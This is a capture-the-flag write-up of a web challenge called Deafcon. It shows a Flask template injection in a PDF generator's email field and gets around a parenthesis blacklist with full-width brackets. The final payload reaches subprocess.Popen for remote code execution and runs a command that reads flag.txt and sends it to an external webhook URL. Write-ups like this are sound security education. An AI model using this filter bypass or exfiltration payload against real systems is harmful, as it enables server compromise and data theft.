---
grand_parent: Categories
parent: Web
title: Deafcon
nav_order: 7
---

# Deafcon

```
Deafcon 2022 is finally here! Make sure you don't miss it.
```

## Challenge

> Flask SSTI with standard parenthesis blacklisted `()`, use the full-width variant instead `（）`.

Visiting the site, it allows us to generate a PDF using 2 input parameters (`name` and `email`):

<img src="images/deafcon-1.png">

<!-- {% raw %} -->

Attempting to inject a SSTI payload `{{191*7}}` in the `email` field revealed that SSTI is possible:

<!-- {% endraw %} -->

<img src="images/deafcon-2.png">

> The `name` field only accepted `[a-zA-Z0-9_ ]` so we will be injecting via the email field.

Checking for any other blacklisted characters, we see that parenthesis is denied:

<img src="images/deafcon-3.png">

So let's try it out with a full-width bracket (url-encoded values `%EF%BC%88` and `%EF%BC%89`):

<img src="images/deafcon-4.png">

<!-- {% raw %} -->

Attempting to inject the SSTI payload to retrieve all loaded subclasses `{{''.__class__.__mro__[1].__subclasses__（）}}`:

<!-- {% endraw %} -->

<img src="images/deafcon-5.png">

Shows that injection was successful and we are now able to find the index of `<class 'subprocess.Popen' >`, which was found at index 429. With access to `subprocess.Popen`, we are able to achieve RCE using the following payload in the `email` field:

<!-- {% raw %} -->

```
"{{''.__class__.__mro__[1].__subclasses__（）[429]（['cat flag.txt|xargs -I {} curl https://webhook.site/e3c7ad5f-a6fc-4479-8a24-ca5b45376017?flag={}'],shell=True）}}"@b.com
```

<!-- {% endraw %} -->

which reads the flag and sends it to our controlled domain:

<img src="images/deafcon-6.png">

Flag: `	flag{001a305ac5ab4b4ea995e5719ab10104}`
